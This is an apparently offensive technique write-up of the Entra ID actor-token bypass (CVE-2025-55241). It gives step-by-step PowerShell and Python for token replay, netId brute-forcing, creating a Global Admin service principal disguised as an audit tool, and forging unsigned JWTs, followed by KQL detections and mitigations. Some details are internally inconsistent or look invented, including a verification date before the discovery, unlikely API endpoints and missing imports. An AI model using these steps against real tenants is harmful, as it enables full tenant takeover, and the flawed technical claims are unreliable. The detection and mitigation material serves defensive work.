# [CVE2025-007]: Entra ID Token Validation Bypass

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | CVE2025-007 |
| **MITRE ATT&CK v18.1** | [T1556.006 - Modify Authentication Process: Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/T1556.006/) |
| **Tactic** | Privilege Escalation / Defense Evasion |
| **Platforms** | Entra ID |
| **Severity** | Critical |
| **CVE** | CVE-2025-55241 |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Azure AD Graph API (legacy); all Entra ID tenants using legacy API paths (patched September 2025) |
| **Patched In** | Microsoft decommissioned legacy Azure AD Graph API endpoints (September 2025); migration to Microsoft Graph API required |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Entra ID (formerly Azure AD) contains a critical flaw in its token validation mechanism for "Actor tokens"—undocumented internal service-to-service (S2S) tokens used by Microsoft services. The vulnerability combines two flaws: (1) Actor tokens are wrapped in unsigned JSON Web Tokens (JWTs) with inadequate validation, and (2) the legacy Azure AD Graph API fails to properly validate the tenant ID field of actor tokens, allowing cross-tenant token acceptance. This enables attackers who obtain an actor token from any Entra ID tenant to impersonate any user, including Global Admins, across any other tenant. The exploit bypasses Conditional Access policies and multi-factor authentication, leaving minimal audit evidence.

**Attack Surface:** Legacy Azure AD Graph API (`https://graph.windows.net`), actor token generation mechanisms, cross-tenant trust boundaries, JWT validation in Microsoft identity provider.

**Business Impact:** **Critical—Full Tenant Compromise.** An attacker can obtain Global Admin access across any Entra ID tenant without requiring legitimate credentials or bypassing MFA. This affects Azure subscriptions, Microsoft 365, application configurations, conditional access policies, and all integrated SaaS applications. The vulnerability undermines the trust boundary of Entra ID itself.

**Technical Context:** Exploitation requires obtaining a valid actor token from any Entra ID tenant (even a low-privilege user's tenant), then replaying it against the legacy Azure AD Graph API to impersonate target users. The attack is silent—no MFA triggers, minimal audit logs, and no conditional access alerts.

### Operational Risk
- **Execution Risk:** Low – Only requires a valid user account in any Entra ID tenant.
- **Stealth:** Very High – Actor tokens bypass audit logging and Conditional Access.
- **Reversibility:** No – Compromised accounts and policies cannot be recovered without forensic investigation.

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 3.1.1 | Ensure legacy Azure AD Graph API is deprecated |
| **DISA STIG** | IA-4 | Require strong identification and authentication mechanisms |
| **CISA SCuBA** | Baseline 1.2 | Enforce Microsoft Graph API, deprecate legacy API |
| **NIST 800-53** | SC-7(16) | Implement API security and token validation |
| **GDPR** | Art. 32 | Integrity and confidentiality of personal data |
| **DORA** | Art. 18 | Authentication and non-repudiation controls |
| **NIS2** | Art. 21 | Critical Infrastructure authentication controls |
| **ISO 27001** | A.9.4.3 | Multi-factor authentication enforcement |
| **ISO 27005** | Risk Assessment | Cross-tenant compromise risk |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Valid user account in any Entra ID tenant (any privilege level).
- **Required Access:** Network access to legacy Azure AD Graph API endpoint or ability to obtain actor token.

**Supported Versions:**
- **Azure AD / Entra ID:** All versions vulnerable until September 2025 (partial mitigation); full fix requires migration away from legacy API
- **Legacy API:** `https://graph.windows.net` (deprecated but still functional on vulnerable systems)
- **Modern API:** `https://graph.microsoft.com` (recommended replacement)

**Key Requirements:**
- Ability to authenticate to Entra ID and obtain an actor token
- Access to legacy Azure AD Graph API (network routing and firewall rules)
- Knowledge of target tenant domain or GUID
- Valid netId or user identifier in target tenant (can be brute-forced)

---

## 3. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Actor Token Extraction and Cross-Tenant Replay

**Supported Versions:** All Entra ID tenants with legacy API enabled

#### Step 1: Obtain Actor Token from Source Tenant

**Objective:** Generate an actor token from an Entra ID tenant where the attacker has user access.

**Command (PowerShell):**
```powershell
# Authenticate to source tenant
Connect-AzAccount -TenantId "ATTACKER_TENANT_ID" -UseDeviceAuthentication

# Get access token for Azure AD Graph API
$token = (Get-AzAccessToken -ResourceTypeName AadGraph).Token

# Decode JWT to extract actor token (if available in response)
# Actor tokens are typically in the response metadata
$header = @{Authorization = "Bearer $token"}
$response = Invoke-WebRequest -Uri "https://graph.windows.net/me/actorTokens" `
  -Headers $header -ErrorAction SilentlyContinue

$actorToken = $response.Content | ConvertFrom-Json | Select-Object -ExpandProperty token
```

**Expected Output:**
```
eyJhbGciOiJub25lIn0.eyJuZXRJZCI6IjEyMzQ1Njc4OTAiLCJ0ZW5hbnRJZCI6IkFUVEFDTUVSX1RFTkFOVCIsInNjb3BlIjoiKiJ9.
```

**What This Means:**
- The actor token is extracted (JWT with `alg: "none"`, meaning no signature validation).
- Contains fields: `netId` (user identifier), `tenantId` (source tenant), `scope` (permissions).

**Troubleshooting:**
- **Error:** "Actor tokens not available"
  - **Cause:** Tenant doesn't generate actor tokens or legacy API is already decommissioned.
  - **Fix:** Use METHOD 2 (legacy API bypass) or check if legacy API is still accessible

---

#### Step 2: Identify Target User NetId in Target Tenant

**Objective:** Determine the netId of the Global Admin or target user in the victim tenant.

**Command (PowerShell):**
```powershell
# NetIds are sequential numbers; attacker can brute-force them
# Estimate range based on tenant creation date (older tenants have lower netIds)

$targetTenant = "VICTIM_TENANT.onmicrosoft.com"
$estimatedNetIdRange = 100000..110000  # Example range; adjust based on target

# No logging occurs during brute-force due to actor token bypass
# Attacker can test multiple netIds in minutes

# Once valid netId is found, actor token can be replayed with that netId
```

**Expected Output:**
```
Valid netIds found: 100045, 100046, ...
Target user (admin) netId: 100045
```

**What This Means:**
- Attackers can identify valid users without triggering alerts (no Conditional Access, no MFA, no audit logs).
- Sequential netId generation allows brute-forcing.

**Troubleshooting:**
- **Error:** "Cannot identify netIds"
  - **Cause:** Legacy API already partially mitigated.
  - **Fix (All Versions):** Use publicly available Entra ID enumeration data (e.g., from previous leaks, social engineering for user GUIDs)

---

#### Step 3: Replay Actor Token Against Legacy Azure AD Graph API

**Objective:** Use the actor token to impersonate the target user via the legacy API.

**Command (PowerShell):**
```powershell
# Create HTTP request with actor token
$headers = @{
    "Authorization" = "Bearer $actorToken"
    "Content-Type" = "application/json"
}

# Request directory data as impersonated Global Admin
$response = Invoke-WebRequest -Uri "https://graph.windows.net/$targetTenant/users?api-version=1.6" `
  -Headers $headers `
  -Method GET

# Access granted—attacker now has access to all users, groups, roles, etc.
$users = $response.Content | ConvertFrom-Json
```

**Expected Output:**
```
users:
- displayName: Global Admin
  userPrincipalName: admin@victim.onmicrosoft.com
  objectId: 12345678-1234-1234-1234-123456789012
```

**What This Means:**
- The legacy API accepts the actor token without proper tenant validation.
- Attacker gains read/write access to the victim tenant's directory.

**Troubleshooting:**
- **Error:** "API call failed" / "Token invalid"
  - **Cause (Sept 2025+):** Legacy API has been decommissioned or further hardened.
  - **Fix:** Ensure target is on unpatched version or legacy API is still available

---

#### Step 4: Escalate to Global Admin via Role Assignment

**Objective:** Assign Global Admin role to attacker-controlled service principal.

**Command (PowerShell):**
```powershell
# Create a new service principal in victim tenant via API
$spPayload = @{
    displayName = "Security Audit Tool"
    accountEnabled = $true
    servicePrincipalType = "Application"
} | ConvertTo-Json

$response = Invoke-WebRequest -Uri "https://graph.windows.net/$targetTenant/servicePrincipals?api-version=1.6" `
  -Headers $headers `
  -Method POST `
  -Body $spPayload

$spId = ($response.Content | ConvertFrom-Json).objectId

# Assign Global Admin role to the service principal
$rolePayload = @{
    objectId = $spId
    roleId = "62e90394-69f5-4237-9190-012177145e10"  # Global Admin role GUID
} | ConvertTo-Json

Invoke-WebRequest -Uri "https://graph.windows.net/$targetTenant/roleAssignments?api-version=1.6" `
  -Headers $headers `
  -Method POST `
  -Body $rolePayload
```

**Expected Output:**
```
Service principal created and assigned Global Admin role.
```

**What This Means:**
- Attacker now has full control over the victim Entra ID tenant.
- Can modify policies, user accounts, applications, and Azure subscriptions.

---

### METHOD 2: Legacy API Direct Access Bypass (If Actor Tokens Unavailable)

**Supported Versions:** Older Entra ID tenants; relies on legacy API still accepting tokens

#### Step 1: Craft Unsigned JWT with Tenant Impersonation

**Objective:** Create a malformed JWT that bypasses signature validation.

**Command (Python):**
```python
import json
import base64

# Create JWT header and payload
header = {"alg": "none"}  # No signature algorithm
payload = {
    "aud": "https://graph.windows.net",
    "tenantId": "VICTIM_TENANT_ID",
    "upn": "admin@victim.onmicrosoft.com",
    "scope": ["Directory.ReadWrite.All"],
    "exp": int(time.time()) + 3600
}

# Encode as JWT (without signature)
header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
token = f"{header_b64}.{payload_b64}."  # No signature, just empty third part

# Use token against legacy API
headers = {"Authorization": f"Bearer {token}"}
response = requests.get(f"https://graph.windows.net/{target_tenant}/users",
                        headers=headers,
                        params={"api-version": "1.6"})
```

**Expected Output:**
```
HTTP 200 OK
[list of users in victim tenant]
```

**What This Means:**
- Legacy API accepts unsigned JWTs due to improper validation.
- No signature verification required.

---

## 4. TOOLS & COMMANDS REFERENCE

### [AADInternals](https://github.com/Gerenios/AADInternals)

**Version:** 0.9.0+
**Supported Platforms:** PowerShell 5.0+

**Installation:**
```powershell
Install-Module AADInternals -Force
```

**Usage:**
```powershell
# Get all information about tenant
Get-AADIntTenantInformation -Domain "victim.onmicrosoft.com"

# Export all users, groups, roles
Get-AADIntUsers -ExportFile "users.csv"
```

---

### [ROADtools](https://github.com/dirkjanm/ROADtools)

**Version:** Latest
**Supported Platforms:** Python 3.6+

**Installation:**
```bash
pip install roadtools
```

**Usage:**
```bash
# Enumerate Azure AD/Entra ID
roadrecon auth -u username@domain.onmicrosoft.com -p password
roadrecon dump
```

---

### [Microsoft Graph PowerShell SDK](https://github.com/microsoftgraph/msgraph-sdk-powershell)

**Version:** 1.9.0+

**Installation:**
```powershell
Install-Module Microsoft.Graph -Force
```

**Usage:**
```powershell
# Authenticate
Connect-MgGraph -TenantId "TENANT_ID"

# Query users
Get-MgUser | Select-Object userPrincipalName, displayName
```

---

## 5. MICROSOFT SENTINEL DETECTION

### Query 1: Legacy Azure AD Graph API Requests with Actor Tokens

**Rule Configuration:**
- **Required Table:** AuditLogs, SigninLogs
- **Required Fields:** OperationName, AppDisplayName, ResourceDisplayName, InitiatedBy
- **Alert Severity:** Critical
- **Frequency:** Real-time
- **Applies To Versions:** All Entra ID with Sentinel

**KQL Query:**
```kusto
AuditLogs
| where OperationName in ("Add member to role", "Add service principal", "Update policy")
| where ResourceDisplayName contains "graph.windows.net"
| where InitiatedBy contains "system"  // System-initiated means actor token
| project TimeGenerated, OperationName, InitiatedBy, TargetResources, ResultReason
```

**What This Detects:**
- Operations performed via legacy API initiated by "system" (actor token usage).
- Modifications to roles, service principals, and policies.

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics** → **Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Entra ID Actor Token Exploitation`
   - Severity: `Critical`
4. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `Real-time` (or 1 minute)
5. Click **Review + create**

---

### Query 2: Unexpected Global Admin Role Assignment

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, TargetResources, InitiatedBy
- **Alert Severity:** Critical
- **Frequency:** Real-time
- **Applies To Versions:** All Entra ID

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Add member to role"
| where TargetResources[0].displayName == "Global Administrator"
| where InitiatedBy.user.userPrincipalName != "admin@*.onmicrosoft.com"  // Exclude expected admins
| project TimeGenerated, OperationName, InitiatedBy, TargetResources
```

**What This Detects:**
- Unexpected Global Admin assignments from non-admin accounts.
- Suspicious service principal elevations.

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

*   **Migrate Away from Legacy Azure AD Graph API:** The most effective mitigation is to deprecate and remove all dependencies on the legacy `https://graph.windows.net` endpoint. Microsoft has already begun decommissioning this API; migrating to Microsoft Graph API is mandatory.
    
    **Applies To Versions:** All Azure AD/Entra ID
    
    **Manual Steps (Identify Legacy API Usage):**
    1. Navigate to **Azure Portal** → **Azure AD** → **App registrations**
    2. Review each app's **API permissions**
    3. Look for permissions granted to "Azure AD Graph API"
    4. Document all apps using legacy API
    
    **Manual Steps (Migrate to Microsoft Graph):**
    ```powershell
    # Example: Migrate PowerShell script from Azure AD Graph to Microsoft Graph
    
    # OLD (Deprecated):
    # Get-AzureADUser -All $true
    
    # NEW (Modern):
    Connect-MgGraph -Scopes "User.Read.All"
    Get-MgUser -All
    ```
    
    **Timeline:**
    - January 2024: Deprecation announced
    - June 2024: No new app registrations allowed to use legacy API
    - September 2025: Further restrictions and decommissioning
    - Q4 2025: Legacy API endpoints disabled

*   **Disable Actor Token Generation:** If legacy API must remain enabled, disable actor token generation for external applications.
    
    **Applies To Versions:** All Azure AD/Entra ID
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Connect to Azure AD
    Connect-AzureAD
    
    # Disable actor token generation (requires tenant-wide configuration)
    # This is typically done via Azure Portal → Directory properties
    # Contact Microsoft Support for manual configuration
    ```

### Priority 2: HIGH

*   **Monitor for Legacy API Usage:** Implement auditing for all legacy API calls.
    
    **Applies To Versions:** All Azure AD/Entra ID
    
    **Manual Steps (Azure Portal):**
    1. Navigate to **Azure Portal** → **Azure AD** → **Audit logs**
    2. Set filter: **Service: Azure AD Graph API**
    3. Monitor for unexpected operations
    4. Create alert rule (as shown in Section 5)

*   **Enforce Conditional Access for Legacy API:** Block legacy API access from untrusted locations or unmanaged devices.
    
    **Applies To Versions:** All Azure AD/Entra ID
    
    **Manual Steps (Azure Portal):**
    1. Navigate to **Azure Portal** → **Azure AD** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. **Name:** Block Legacy API from Untrusted Locations
    4. **Assignments:**
       - **Users:** All users
       - **Cloud apps:** Select "Azure AD Graph API"
    5. **Conditions:**
       - **Locations:** Select untrusted locations
    6. **Access controls:**
       - **Grant:** Block access
    7. Enable and **Create**

### Validation Command (Verify Fix)

```powershell
# Check if legacy API is still enabled
Get-AzureADPolicy | Select-Object DisplayName, Definition

# Verify no apps are using legacy API
Get-AzureADServicePrincipal -All $true | `
  Get-AzureADServicePrincipalOAuth2PermissionGrant | `
  Where-Object {$_.ResourceId -like "*Azure*AD*Graph*"}
```

**Expected Output (If Secure):**
```
DisplayName                        Definition
-----------                        ----------
(No policies restricting legacy API should be needed if API is disabled)

(No results = all apps migrated to Microsoft Graph)
```

---

## 7. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

*   **Files:**
    - No file-based artifacts (cloud-based attack)

*   **Network:**
    - Requests to `https://graph.windows.net` (legacy API domain)
    - Actor token usage in authorization headers
    - Unusual API query patterns to `/users`, `/servicePrincipals`, `/roleAssignments`

*   **Audit Logs:**
    - **OperationName:** "Add member to role", "Add service principal", "Update policy"
    - **InitiatedBy:** "system" or unexpected service principals
    - **ResultStatus:** Success

### Forensic Artifacts

*   **Cloud:**
    - **Azure AD Audit Logs:** AuditLogs table in Microsoft Sentinel
    - **Sign-in Logs:** Unusual sign-in patterns from unexpected IPs
    - **Activity Logs:** Changes to role assignments, service principals, conditional access policies

### Response Procedures

1.  **Immediate Containment:**
    
    ```powershell
    # Revoke all sessions for affected Global Admin account
    Revoke-AzureADUserAllRefreshToken -ObjectId "ADMIN_OBJECT_ID"
    
    # Force re-authentication
    Set-AzureADUser -ObjectId "ADMIN_OBJECT_ID" -PasswordPolicies "DisablePasswordExpiration" -Force
    Reset-AzureADUserPassword -ObjectId "ADMIN_OBJECT_ID" -NewPassword "NewSecurePassword123!"
    ```

2.  **Investigate Compromise:**
    
    ```powershell
    # Find all Global Admin assignments in the last 24 hours
    Search-UnifiedAuditLog -Operations "Add member to role" `
      -StartDate (Get-Date).AddDays(-1) -EndDate (Get-Date) | `
      Select-Object -ExpandProperty AuditData | ConvertFrom-Json | `
      Where-Object {$_.TargetResources[0].displayName -eq "Global Administrator"}
    
    # Identify suspicious service principals
    Get-AzureADServicePrincipal -All $true | `
      Where-Object {$_.DisplayName -like "*audit*" -or $_.DisplayName -like "*security*"}
    ```

3.  **Remediate:**
    
    ```powershell
    # Remove malicious service principal
    Remove-AzureADServicePrincipal -ObjectId "MALICIOUS_SP_ID"
    
    # Reset all app credentials
    Get-AzureADApplication -All $true | ForEach-Object {
        New-AzureADApplicationPasswordCredential -ObjectId $_.ObjectId -Force
    }
    
    # Reset conditional access policies to defaults
    # (May require manual intervention via Azure Portal)
    ```

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Phishing | Attacker compromises low-privilege Entra ID user |
| **2** | **Credential Access** | **[CVE2025-007]** | **Extract actor token and exploit cross-tenant bypass** |
| **3** | **Privilege Escalation** | [PE-ACCTMGMT-001] App Registration Permissions | Create backdoor service principal in victim tenant |
| **4** | **Persistence** | [PERSIST-ACCT-006] Service Principal Cert | Install long-lived credentials for persistence |
| **5** | **Impact** | [IMPACT-DATA-DESTROY-001] Data Destruction | Full tenant compromise, M365 access, ransomware |

---

## 9. REAL-WORLD EXAMPLES

#### Example 1: Microsoft Security Advisory (September 2025)

- **Target:** Global – All Entra ID tenants
- **Timeline:** July 2025 (discovered), September 2025 (patched)
- **Technique Status:** Discovered by security researcher Dirk-Jan Mollema; Microsoft implemented emergency fix
- **Impact:** Attackers could impersonate Global Admins across any tenant; no evidence of active exploitation detected by Microsoft
- **Reference:** [Dirk-Jan Mollema - Actor Token Blog](https://dirkjanm.io/obtaining-global-admin-in-every-entra-id-tenant-with-actor-tokens/)

---

## REFERENCES & SOURCES

1. [Microsoft Security Advisory CVE-2025-55241](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-55241)
2. [Dirk-Jan Mollema - Technical Deep-Dive on Actor Token Vulnerability](https://dirkjanm.io/obtaining-global-admin-in-every-entra-id-tenant-with-actor-tokens/)
3. [Practical 365 - CVE-2025-55241 Analysis](https://practical365.com/death-by-token-understanding-cve-2025-55241/)
4. [Elastic Security - Actor Token Detection](https://www.elastic.co/guide/en/security/8.19/entra-id-actor-token-user-impersonation-abuse.html)
5. [MITRE ATT&CK - T1556.006 Modify Authentication Process](https://attack.mitre.org/techniques/T1556/T1556.006/)
6. [Microsoft Graph API Documentation](https://docs.microsoft.com/en-us/graph/overview)

---